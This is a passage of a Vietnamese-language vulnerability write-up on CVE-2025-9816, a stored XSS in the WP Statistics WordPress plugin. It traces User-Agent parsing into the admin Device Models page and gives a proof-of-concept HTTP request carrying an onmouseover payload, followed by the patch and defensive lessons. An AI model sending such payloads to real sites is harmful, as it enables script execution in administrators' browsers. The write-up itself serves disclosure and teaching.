&lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;👉 &lt;code&gt;active()&lt;/code&gt; luôn true =&amp;gt; &lt;code&gt;Visitor::record()&lt;/code&gt; được gọi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt; public static function record($visitorProfile, $arg = array())&#xA;{&#xA;    global $wpdb;&#xA;&#xA;    // Define the array of defaults&#xA;    $defaults = array(&#xA;        &amp;#39;location&amp;#39;         =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;exclusion_match&amp;#39;  =&amp;gt; false,&#xA;        &amp;#39;exclusion_reason&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;        &amp;#39;page_id&amp;#39;          =&amp;gt; 0&#xA;    );&#xA;&#xA;    $userAgent    = $visitorProfile-&amp;gt;getUserAgent(); &amp;lt;-- focus&#xA;    $same_visitor = $visitorProfile-&amp;gt;isIpActiveToday();&#xA;&#xA;    // If we have a new Visitor in Day&#xA;    if (!$same_visitor) {&#xA;&#xA;        // Prepare Visitor information&#xA;        $visitor = array(&#xA;            &amp;#39;agent&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getBrowser(),&#xA;            &amp;#39;platform&amp;#39;       =&amp;gt; $userAgent-&amp;gt;getPlatform(),&#xA;            &amp;#39;version&amp;#39;        =&amp;gt; $userAgent-&amp;gt;getVersion(),&#xA;            &amp;#39;device&amp;#39;         =&amp;gt; $userAgent-&amp;gt;getDevice(),&#xA;            &amp;#39;model&amp;#39;          =&amp;gt; $userAgent-&amp;gt;getModel(), &amp;lt;-- focus&#xA;            // other logic&#xA;        );&#xA;&#xA;        $visitor = apply_filters(&amp;#39;wp_statistics_visitor_information&amp;#39;, $visitor);&#xA;&#xA;        //Save Visitor TO DB&#xA;        $visitor_id = self::save_visitor($visitor, $visitorProfile);&#xA;&#xA;    } else {&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Plugin lấy user-agent từ http request và gán vào &lt;code&gt;$userAgent&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug1.png&#34;&#xA;    alt=&#34;Debug cho $userAgent&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug cho $userAgent&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau đó gán vào mảng &lt;code&gt;$visitor&lt;/code&gt; và lưu thông tin &lt;strong&gt;visitor&lt;/strong&gt; vào database bằng hàm &lt;code&gt;save_visitor()&lt;/code&gt;. Ta cần focus vào dòng code chứa model:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;#39;model&amp;#39; =&amp;gt; $userAgent-&amp;gt;getModel()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;&#39;model&#39;&lt;/code&gt; là giá trị trả về của &lt;code&gt;getModel()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getModel()&#xA;{&#xA;    $model = &amp;#39;&amp;#39;;&#xA;&#xA;    if (! empty($this-&amp;gt;deviceDetector)) {&#xA;        $brand  = $this-&amp;gt;deviceDetector-&amp;gt;getBrandName();&#xA;        $device = $this-&amp;gt;deviceDetector-&amp;gt;getModel();&#xA;&#xA;        if (!empty($device)) {&#xA;            $words = explode(&amp;#39; &amp;#39;, trim($device));&#xA;            $device = $words[0] ?? null;&#xA;&#xA;            if (! empty($device) &amp;amp;&amp;amp; ctype_digit($device)) {&#xA;                $device = &amp;#39;&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        $model = trim($brand . &amp;#39; &amp;#39; . $device);&#xA;    }      &#xA;&#xA;    return $model ?? null;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Các logic trong &lt;code&gt;getModel()&lt;/code&gt; liên quan đến &lt;code&gt;deviceDetector&lt;/code&gt; được khởi tạo trong &lt;code&gt;__construct&lt;/code&gt;, ta cần tìm hiểu nó là gì:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class UserAgentService&#xA;{&#xA;    public function __construct()&#xA;    {&#xA;        try {&#xA;            // Get HTTP User Agent&#xA;            $userAgent = UserAgent::getHttpUserAgent();&#xA;&#xA;            // Initialize DeviceDetector with the user agent string&#xA;            $this-&amp;gt;deviceDetector = new \WP_Statistics\Dependencies\DeviceDetector\DeviceDetector($userAgent);&#xA;            $this-&amp;gt;deviceDetector-&amp;gt;parse();&#xA;&#xA;        } catch (Exception $e) {&#xA;            // In case of an error, set deviceDetector to null&#xA;            $this-&amp;gt;deviceDetector = null;&#xA;        }&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;deviceDetector&lt;/code&gt; là một thể hiển của class &lt;code&gt;DeviceDetector&lt;/code&gt;, khởi tạo với tham số &lt;code&gt;$userAgent&lt;/code&gt; là user-agent được lấy từ HTTP request.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug2.png&#34;&#xA;    alt=&#34;Debug cho $userAgent&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug cho $userAgent&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;pre&gt;&lt;code&gt;class DeviceDetector &#xA;{&#xA;    public function __construct(string $userAgent = &amp;#39;&amp;#39;, ?ClientHints $clientHints = null)&#xA;    {&#xA;        if (&amp;#39;&amp;#39; !== $userAgent) {&#xA;            $this-&amp;gt;setUserAgent($userAgent);&#xA;        }&#xA;&#xA;        if ($clientHints instanceof ClientHints) {&#xA;            $this-&amp;gt;setClientHints($clientHints);&#xA;        }&#xA;&#xA;        $this-&amp;gt;addClientParser(new FeedReader());&#xA;        $this-&amp;gt;addClientParser(new MobileApp());&#xA;        $this-&amp;gt;addClientParser(new MediaPlayer());&#xA;        $this-&amp;gt;addClientParser(new PIM());&#xA;        $this-&amp;gt;addClientParser(new Browser());&#xA;        $this-&amp;gt;addClientParser(new Library());&#xA;&#xA;        $this-&amp;gt;addDeviceParser(new HbbTv());&#xA;        $this-&amp;gt;addDeviceParser(new ShellTv());&#xA;        $this-&amp;gt;addDeviceParser(new Notebook());&#xA;        $this-&amp;gt;addDeviceParser(new Console());&#xA;        $this-&amp;gt;addDeviceParser(new CarBrowser());&#xA;        $this-&amp;gt;addDeviceParser(new Camera());&#xA;        $this-&amp;gt;addDeviceParser(new PortableMediaPlayer());&#xA;        $this-&amp;gt;addDeviceParser(new Mobile());&#xA;&#xA;        $this-&amp;gt;addBotParser(new Bot());&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;DeviceDetector&lt;/code&gt; set user-agent và thêm &lt;strong&gt;parser&lt;/strong&gt; cho từng loại &lt;strong&gt;device/app&lt;/strong&gt;, các parser này có thể liên quan đến &lt;code&gt;$this-&amp;gt;deviceDetector-&amp;gt;parse();&lt;/code&gt; được gọi ở trên.&lt;/p&gt;&#xA;&lt;p&gt;Ta tìm hiểu thử đối số &lt;code&gt;new Mobile()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Mobile extends AbstractDeviceParser&#xA;{&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $fixtureFile = &amp;#39;regexes/device/mobiles.yml&amp;#39;;&#xA;&#xA;    /**&#xA;     * @var string&#xA;     */&#xA;    protected $parserName = &amp;#39;mobile&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$fixtureFile&lt;/code&gt; trong &lt;code&gt;Mobile&lt;/code&gt; là đường dẫn đến file chứa các regex, để hiểu rõ hơn, ta nhấn tổ hợp phím &lt;kbd&gt;Ctrl&lt;/kbd&gt; + &lt;kbd&gt;Shift&lt;/kbd&gt; + &lt;kbd&gt;P&lt;/kbd&gt; và search với &lt;code&gt;regexes/device/mobiles.yml&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/search3.png&#34;&#xA;    alt=&#34;Tìm kiếm file regexes/device/mobiles.yml&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tìm kiếm file regexes/device/mobiles.yml&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;em&gt;Tìm kiếm file regexes/device/mobiles.yml&lt;/em&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nội dung file &lt;code&gt;mobile.yml&lt;/code&gt;{: .filepath}:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;# Gol Mobile (gol-mobile.com)&#xA;Gol Mobile:&#xA;  regex: &amp;#39;(?:F10_PRIME|F3Prime|F9_PLUS|TEAM_7_3G)(?:[);/ ]|$)&amp;#39;&#xA;  device: &amp;#39;smartphone&amp;#39;&#xA;  models:&#xA;    - regex: &amp;#39;F10_PRIME&amp;#39;&#xA;      model: &amp;#39;F10 Prime&amp;#39;&#xA;    - regex: &amp;#39;F3Prime&amp;#39;&#xA;      model: &amp;#39;F3 Prime&amp;#39;&#xA;    - regex: &amp;#39;F9_PLUS&amp;#39;&#xA;      model: &amp;#39;F9 Plus&amp;#39;&#xA;    - regex: &amp;#39;TEAM_7_3G&amp;#39;&#xA;      device: &amp;#39;tablet&amp;#39;&#xA;      model: &amp;#39;Team 7.0 3G&amp;#39;&#xA;&#xA;# Goly: &#xA;Goly:&#xA;  regex: &amp;#39;Goly[ _-]&amp;#39;      # match khi UA có &amp;#34;Goly-&amp;#34; hoặc &amp;#34;Goly_&amp;#34; hoặc &amp;#34;Goly &amp;#34;&#xA;  device: &amp;#39;smartphone&amp;#39;    # loại thiết bị&#xA;  models:&#xA;    - regex: &amp;#39;Goly[ _-]([^;/]&amp;#43;) Build&amp;#39;   # lấy model trước &amp;#34;Build&amp;#34;&#xA;      model: &amp;#39;$1&amp;#39;&#xA;    - regex: &amp;#39;Goly[ _-]([^;/)]&amp;#43;)(?:[;/)]|$)&amp;#39;  # lấy model trước ; / ) hoặc hết chuỗi&#xA;      model: &amp;#39;$1&amp;#39;&#xA;&#xA;# other model&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;mobile.yml&lt;/code&gt;{: .filepath} chứa các regex để nhận diện thiết bị mobile, lấy model của nó.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi &lt;code&gt;DeviceDetector&lt;/code&gt; được khởi tạo trong &lt;code&gt;__construct&lt;/code&gt; của class &lt;code&gt;UserAgentService&lt;/code&gt; thì &lt;code&gt;parse()&lt;/code&gt; được gọi để phân tích cú pháp của user-agent.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function parse(): void&#xA;{&#xA;    if ($this-&amp;gt;isParsed()) {&#xA;        return;&#xA;    }&#xA;&#xA;    $this-&amp;gt;parsed = true;&#xA;&#xA;    // skip parsing for empty useragents or those not containing any letter (if no client hints were provided)&#xA;    if ((empty($this-&amp;gt;userAgent) || !\preg_match(&amp;#39;/([a-z])/i&amp;#39;, $this-&amp;gt;userAgent))&#xA;        &amp;amp;&amp;amp; empty($this-&amp;gt;clientHints)&#xA;    ) {&#xA;        return;&#xA;    }&#xA;    // other parse&#xA;&#xA;    $this-&amp;gt;parseDevice();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu chưa được &lt;code&gt;parse (user-agent mới)&lt;/code&gt; thì thực hiện parse bằng hàm &lt;code&gt;parseDevice()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function parseDevice(): void&#xA;{&#xA;    $parsers = $this-&amp;gt;getDeviceParsers();&#xA;&#xA;    foreach ($parsers as $parser) {&#xA;        $parser-&amp;gt;setYamlParser($this-&amp;gt;getYamlParser());&#xA;        $parser-&amp;gt;setCache($this-&amp;gt;getCache());&#xA;        $parser-&amp;gt;setUserAgent($this-&amp;gt;getUserAgent());&#xA;        $parser-&amp;gt;setClientHints($this-&amp;gt;getClientHints());&#xA;&#xA;        if ($parser-&amp;gt;parse()) {&#xA;            $this-&amp;gt;device = $parser-&amp;gt;getDeviceType();&#xA;            $this-&amp;gt;model  = $parser-&amp;gt;getModel();&#xA;            $this-&amp;gt;brand  = $parser-&amp;gt;getBrand();&#xA;&#xA;            break;&#xA;        }&#xA;    }&#xA;    // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;parseDevice()&lt;/code&gt; lấy các parser đã được khởi tạo trong &lt;code&gt;__construct&lt;/code&gt; và gán vào &lt;code&gt;$parsers&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug3.png&#34;&#xA;    alt=&#34;Debug tab cho biến $parsers&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab cho biến $parsers&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Sau đó duyệt qua &lt;code&gt;$parsers&lt;/code&gt;, set cấu hình bao gồm các regex trong file &lt;code&gt;.yml&lt;/code&gt;, nếu regex khớp tức parse thành công, gán model, device, brand cho &lt;code&gt;DeviceDetector&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug4.png&#34;&#xA;    alt=&#34;Debug tab gán giá trị cho các tham số của DeviceDetector&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab gán giá trị cho các tham số của DeviceDetector&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug5.png&#34;&#xA;    alt=&#34;Debug tab giá trị của model&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab giá trị của model&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Như vậy ta đã biết được cách kiểm soát model trước khi gán nó vào &lt;code&gt;$visitor&lt;/code&gt; và thêm vào database.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/debug6.png&#34;&#xA;    alt=&#34;Debug tab giá trị của model trong $visitor&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debug tab giá trị của model trong $visitor&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Kiểm tra &lt;strong&gt;database&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; SELECT ID, last_counter, referred, agent, platform, version, device, model FROM wp_statistics_visitor;&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| ID | last_counter | referred | agent         | platform | version | device     | model        |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&#xA;| 63 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Google Pixel |&#xA;| 64 | 2025-10-01   |          | Chrome Mobile | Android  | 93      | smartphone | Goly payload |&#xA;&amp;#43;----&amp;#43;--------------&amp;#43;----------&amp;#43;---------------&amp;#43;----------&amp;#43;---------&amp;#43;------------&amp;#43;--------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Kiểm tra trong &lt;strong&gt;UI tab models&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/ui1.png&#34;&#xA;    alt=&#34;Model được hiển thị trong UI tab models&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Model được hiển thị trong UI tab models&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Source:&lt;/strong&gt; &lt;code&gt;User-Agent&lt;/code&gt; header (POST &lt;code&gt;/wp-json/wp-statistics/v2/hit&lt;/code&gt;) — DeviceDetector parse → &lt;code&gt;getModel()&lt;/code&gt;.&#xA;&lt;strong&gt;Sink:&lt;/strong&gt; &lt;code&gt;includes/admin/templates/pages/devices/models.php&lt;/code&gt; — &lt;code&gt;echo $item-&amp;gt;model&lt;/code&gt; (không &lt;code&gt;esc_html()&lt;/code&gt; / &lt;code&gt;esc_attr()&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ol&gt;&#xA;&lt;li&gt;Attacker gửi UA chứa payload XSS trong model&lt;/li&gt;&#xA;&lt;li&gt;Model chứa payload được lưu trong database&lt;/li&gt;&#xA;&lt;li&gt;Admin mở tab models =&amp;gt; payload chạy.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Gửi request chứa XSS payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp-statistics/v2/hit HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Linux; Android 14; Goly &amp;#34;onmouseover=alert()-&amp;#34; Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36&#xA;&#xA;wp_statistics_hit=1&amp;amp;source_type=home&amp;amp;source_id=0&amp;amp;search_query=&amp;amp;signature=787b07b8979cb982ec89a4f103a68081&amp;amp;endpoint=hit&amp;amp;referred=&amp;amp;page_uri=Lw%3D%3D&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Admin truy cập endpoint và hover vào model chứa payload:&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=wps_devices_page&amp;amp;tab=models&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/result.png&#34;&#xA;    alt=&#34;Result — PoC execution screenshot&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Result — PoC execution screenshot&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;Dùng &lt;code&gt;&amp;quot;&lt;/code&gt; để đóng title, tạo alert() thông qua sự kiện &lt;strong&gt;onmouseover&lt;/strong&gt; vì đây là thẻ &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt;, &lt;code&gt;-&lt;/code&gt; đùng để nối chuỗi trong JavaScript tránh được lỗi cú pháp&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;CVE-2025-9816&lt;/strong&gt; trong plugin &lt;strong&gt;WP Statistics &amp;lt;= 14.15.4&lt;/strong&gt; cho phép &lt;strong&gt;Stored XSS&lt;/strong&gt; thông qua giá trị &lt;code&gt;model&lt;/code&gt; lấy từ header &lt;code&gt;User-Agent&lt;/code&gt;. Payload được lưu vào DB và hiển thị trong trang quản trị &lt;strong&gt;Device Models&lt;/strong&gt; mà không escape đúng cách. Bản vá &lt;strong&gt;14.15.5&lt;/strong&gt; đã thêm &lt;code&gt;esc_html()&lt;/code&gt;/&lt;code&gt;esc_attr()&lt;/code&gt; khi in ra HTML.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; nguy hiểm hơn reflected vì tồn tại lâu dài trong DB.&lt;/li&gt;&#xA;&lt;li&gt;Dữ liệu đến từ &lt;strong&gt;HTTP headers&lt;/strong&gt; cũng cần được coi như input không tin cậy.&lt;/li&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;escape khi output&lt;/strong&gt; thay vì chỉ sanitize khi input.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Update plugin&lt;/strong&gt; lên bản mới nhất để ngăn chặn khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-statistics/vulnerability/wordpress-wp-statistics-plugin-14-5-4-unauthenticated-stored-cross-site-scripting-via-user-agent-header-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Statistics 